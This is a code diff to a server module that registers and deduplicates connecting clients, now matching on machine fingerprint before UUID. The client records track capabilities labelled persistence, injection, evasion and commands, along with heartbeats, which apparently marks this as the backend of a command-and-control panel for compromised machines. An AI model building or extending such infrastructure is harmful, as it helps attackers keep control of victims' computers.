@@ -58,49 +58,9 @@ const clientIntegration = {
       const uptimeSeconds = systemInfo.uptime || 0;
       const bootTime = systemInfo.bootTime ? new Date(systemInfo.bootTime) : null;
       
-      // Check for existing client by UUID first
-      let client = await Client.findOne({ uuid: clientData.uuid });
+      // Check for existing client by machine fingerprint first (primary deduplication)
+      let client = null;
       
-      if (client) {
-        console.log('Updating existing client by UUID:', client.uuid);
-        // Update existing client
-        client.computerName = clientData.computerName || client.computerName;
-        client.ipAddress = clientData.ipAddress || client.ipAddress;
-        client.hostname = clientData.hostname || client.hostname;
-        client.platform = clientData.platform || client.platform;
-        client.operatingSystem = detectOperatingSystem(clientData.platform, clientData.userAgent) || client.operatingSystem || 'unknown';
-        client.machineFingerprint = clientData.machineFingerprint || client.machineFingerprint;
-        client.uptimeSeconds = uptimeSeconds;
-        client.bootTime = bootTime || client.bootTime;
-        client.connectedAt = new Date();
-        
-        // Properly update capabilities structure
-        if (!client.capabilities) {
-          client.capabilities = {
-            persistence: [],
-            injection: [],
-            evasion: [],
-            commands: [],
-            features: []
-          };
-        }
-        if (clientData.capabilities && Array.isArray(clientData.capabilities)) {
-          console.log('Setting capabilities.features to:', clientData.capabilities);
-          client.capabilities.features = clientData.capabilities;
-        } else {
-          console.log('No valid capabilities array found, keeping empty features array');
-        }
-        client.additionalSystemDetails = clientData.additionalSystemDetails || client.additionalSystemDetails;
-        client.status = 'online';
-        client.lastActiveTime = new Date();
-        client.lastHeartbeat = new Date();
-        
-        await client.save();
-        console.log('Existing client updated successfully');
-        return client;
-      }
-      
-      // Check for existing client by machine fingerprint
       if (clientData.machineFingerprint) {
         client = await Client.findOne({ machineFingerprint: clientData.machineFingerprint });
         
@@ -140,6 +100,50 @@ const clientIntegration = {
           
           await client.save();
           console.log('Client updated with new UUID successfully');
+          return client;
+        }
+      }
+      
+      // Fallback: Check for existing client by UUID
+      if (!client && clientData.uuid) {
+        client = await Client.findOne({ uuid: clientData.uuid });
+        
+        if (client) {
+          console.log('Updating existing client by UUID:', client.uuid);
+          // Update existing client
+          client.computerName = clientData.computerName || client.computerName;
+          client.ipAddress = clientData.ipAddress || client.ipAddress;
+          client.hostname = clientData.hostname || client.hostname;
+          client.platform = clientData.platform || client.platform;
+          client.operatingSystem = detectOperatingSystem(clientData.platform, clientData.userAgent) || client.operatingSystem || 'unknown';
+          client.machineFingerprint = clientData.machineFingerprint || client.machineFingerprint;
+          client.uptimeSeconds = uptimeSeconds;
+          client.bootTime = bootTime || client.bootTime;
+          client.connectedAt = new Date();
+          
+          // Properly update capabilities structure
+          if (!client.capabilities) {
+            client.capabilities = {
+              persistence: [],
+              injection: [],
+              evasion: [],
+              commands: [],
+              features: []
+            };
+          }
+          if (clientData.capabilities && Array.isArray(clientData.capabilities)) {
+            console.log('Setting capabilities.features to:', clientData.capabilities);
+            client.capabilities.features = clientData.capabilities;
+          } else {
+            console.log('No valid capabilities array found, keeping empty features array');
+          }
+          client.additionalSystemDetails = clientData.additionalSystemDetails || client.additionalSystemDetails;
+          client.status = 'online';
+          client.lastActiveTime = new Date();
+          client.lastHeartbeat = new Date();
+          
+          await client.save();
+          console.log('Existing client updated successfully');
           return client;
         }
       }
